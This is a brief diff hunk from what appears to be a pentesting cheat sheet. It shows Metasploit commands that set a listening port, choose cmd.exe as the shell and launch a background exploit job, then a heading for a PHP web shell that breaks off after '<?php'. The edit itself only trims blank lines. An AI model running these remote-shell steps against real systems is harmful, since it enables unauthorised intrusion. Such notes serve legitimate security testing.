@@ -61,11 +61,7 @@ LPORT => 4343
 msetg SHELL cmd.exe
 exploit -j -z
 
-
-
-
-
-    
+  
     == PHP shell. Execute some PHP code on a HTML/PHP page ==
 
 <?php
